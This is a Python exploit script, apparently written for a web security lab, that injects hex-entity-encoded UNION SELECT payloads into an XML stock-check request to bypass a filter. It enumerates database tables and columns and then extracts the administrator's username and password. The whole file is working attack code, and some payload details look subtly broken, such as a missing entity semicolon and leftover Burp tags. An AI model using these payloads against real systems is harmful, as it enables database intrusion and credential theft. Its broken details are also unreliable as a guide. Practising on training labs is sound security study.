# Lab: SQLi with filter bypass via XML encoding
import re
import sys
import codecs
import requests
import urllib3
from bs4 import BeautifulSoup
import os
from dotenv import load_dotenv

load_dotenv()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT")
}


def find_users_table(url, path):
    sqli_payload = f"&#x55;NION &#x53;ELECT TABLE_NAME, NULL FROM information_schema.tables"
    xml_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
   <stockCheck>
       <productId>6</productId>
       <storeId>
       1{sqli_payload}
       </storeId>
   </stockCheck>
   """
    headers = {'Content-Type': 'application/xml'}

    r = requests.get(url + path, data=xml_payload, verify=False, headers=headers, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    users_table = soup.find(string=re.compile(".*users.*"))
    print(r.text)

    if users_table:
        print("(-> Found users table")
        return users_table
    else:
        print("(-) Couldn't find users table")
        exit(-1)


def find_username_password_cols(url, path, users_table):
    sqli_payload = f"&#x55;NION &#x53ELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME={users_table}"
    xml_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
       <stockCheck>
           <productId>6</productId>
           <storeId>
           <@hex_entities>
           1{sqli_payload}<@/hex_entities>
           </storeId>
       </stockCheck>
       """
    headers = {'Content-Type': 'application/xml'}

    r = requests.get(url + path, data=xml_payload, verify=False, headers=headers, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    username_col = soup.find(string=re.compile(".*username.*"))
    password_col = soup.find(string=re.compile(".*password.*"))

    if username_col and password_col:
        print("(-> Found username and password cols")
        return username_col, password_col
    else:
        print("(-) Couldn't find username and password cols")
        exit(-1)


def get_admin_credentials(url):
    path = "/product/stock"
    users_table = find_users_table(url, path)
    username_col, password_col = find_username_password_cols(url, path, users_table)

    sqli_payload = f"&#x55;NION &#x53ELECT {username_col}||'~'||{password_col} FROM {users_table} WHERE username='administrator'"
    xml_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
       <stockCheck>
           <productId>6</productId>
           <storeId>
           <@hex_entities>
           1{sqli_payload}<@/hex_entities>
           </storeId>
       </stockCheck>
       """
    headers = {'Content-Type': 'application/xml'}
    r = requests.get(url + path, data=xml_payload, verify=False, headers=headers, proxies=proxies)
    print(r.text)


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    get_admin_credentials(url)


if __name__ == "__main__":
    main()
